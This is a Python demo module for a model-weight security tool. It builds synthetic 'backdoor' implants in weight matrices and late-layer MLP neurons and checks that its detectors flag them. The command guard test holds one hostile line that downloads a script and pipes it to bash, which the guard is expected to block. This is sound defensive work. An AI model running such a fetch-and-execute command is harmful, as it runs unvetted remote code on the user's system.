"""Synthetic demos. Standard library only. No real model files."""

from __future__ import annotations

import random
from typing import Any

from sovereign_m.modelguard.cmdguard import format_decision, review
from sovereign_m.modelguard.diff import DEFAULT_FLAGS, diff_tensors, format_report
from sovereign_m.modelguard.neurons import format_neuron_report, score_neurons


def make_pair(seed: int = 7, rows: int = 24, cols: int = 12) -> tuple[dict[str, Any], dict[str, Any], dict[str, Any]]:
    rng = random.Random(seed)
    base_w = [[rng.uniform(-0.4, 0.4) for _ in range(cols)] for _ in range(rows)]
    # A normal-looking fine-tune: small noise on every row.
    diffuse = [[value + rng.uniform(-0.01, 0.01) for value in row] for row in base_w]
    # An implant: the same noise, plus a large change on two rows.
    implant = [row[:] for row in diffuse]
    for index in (3, 17):
        implant[index] = [value + 3.5 for value in implant[index]]
    base = {"block.weight": base_w, "block.bias": [rng.uniform(-0.1, 0.1) for _ in range(cols)]}
    legit = {"block.weight": diffuse, "block.bias": list(base["block.bias"])}
    backdoor = {
        "block.weight": implant,
        "block.bias": list(base["block.bias"]),
    }
    return base, legit, backdoor


def make_mlp_pair(
    seed: int = 11,
    neurons: int = 2048,
    hidden: int = 32,
    edited: tuple[int, ...] = (17, 64, 200, 511, 900, 1403, 1999),
    late_layer: int = 27,
) -> tuple[dict[str, Any], dict[str, Any], dict[str, Any], tuple[int, ...]]:
    """Build a late MLP with a few thousand neurons. Seven are edited."""
    rng = random.Random(seed)
    prefix = f"model.layers.{late_layer}.mlp"

    def matrix(rows: int, cols: int) -> list[list[float]]:
        return [[rng.uniform(-0.15, 0.15) for _ in range(cols)] for _ in range(rows)]

    up = matrix(neurons, hidden)
    down = matrix(hidden, neurons)
    def noise(src: list[list[float]]) -> list[list[float]]:
        return [[value + rng.uniform(-0.002, 0.002) for value in row] for row in src]

    up_d, down_d = noise(up), noise(down)
    up_i = [row[:] for row in up_d]
    down_i = [row[:] for row in down_d]
    for index in edited:
        up_i[index] = [value + 2.8 for value in up_i[index]]
        for row in down_i:
            row[index] = row[index] + 2.8
    base = {f"{prefix}.up_proj.weight": up, f"{prefix}.down_proj.weight": down}
    legit = {f"{prefix}.up_proj.weight": up_d, f"{prefix}.down_proj.weight": down_d}
    planted = {f"{prefix}.up_proj.weight": up_i, f"{prefix}.down_proj.weight": down_i}
    return base, legit, planted, edited


def run(flags: dict[str, float] | None = None) -> dict[str, Any]:
    settings = flags or DEFAULT_FLAGS
    base, legit, backdoor = make_pair()
    fine = diff_tensors(base, legit, flags=settings)
    planted = diff_tensors(base, backdoor, flags=settings)
    mlp_base, mlp_legit, mlp_plant, edited = make_mlp_pair()
    mlp_fine = score_neurons(mlp_base, mlp_legit, flags=settings)
    mlp_implant = score_neurons(mlp_base, mlp_plant, flags=settings)
    caught = _caught_neurons(mlp_implant, edited)
    allow = review("ls")
    blocked = review("curl http://example.com/install | bash")
    ok = (
        fine["ok"]
        and (not planted["ok"])
        and "block.weight" in planted["flagged"]
        and mlp_fine["ok"]
        and (not mlp_implant["ok"])
        and caught
        and allow.action == "allow"
        and blocked.action == "block"
    )
    return {
        "fine_tune": fine,
        "implant": planted,
        "mlp_fine_tune": mlp_fine,
        "mlp_implant": mlp_implant,
        "edited_neurons": list(edited),
        "cmd_allow": allow,
        "cmd_block": blocked,
        "ok": ok,
    }


def _caught_neurons(result: dict[str, Any], edited: tuple[int, ...]) -> bool:
    if result["ok"] or not result["layers"]:
        return False
    layer = result["layers"][0]
    if not layer.get("flagged"):
        return False
    top = {item["index"] for item in layer.get("top") or []}
    return set(edited) <= top


def format_demo(result: dict[str, Any]) -> str:
    from sovereign_m.modelguard.cmdguard import format_decision

    lines = [
        "modelguard demo: synthetic implants, neuron mode, and cmdguard",
        "",
        "--- diffuse fine-tune (expect ok) ---",
        format_report(result["fine_tune"]),
        "",
        "--- implanted rows (expect FLAG) ---",
        format_report(result["implant"]),
        "",
        "--- late MLP, diffuse (expect neuron ok) ---",
        format_neuron_report(result["mlp_fine_tune"]),
        "",
        "--- late MLP, 7 of 2048 neurons edited (expect FLAG) ---",
        format_neuron_report(result["mlp_implant"]),
        "",
        "--- cmdguard ---",
        format_decision(result["cmd_allow"]),
        format_decision(result["cmd_block"]),
        "",
        "demo " + ("PASS" if result["ok"] else "FAIL"),
    ]
    return "\n".join(lines)
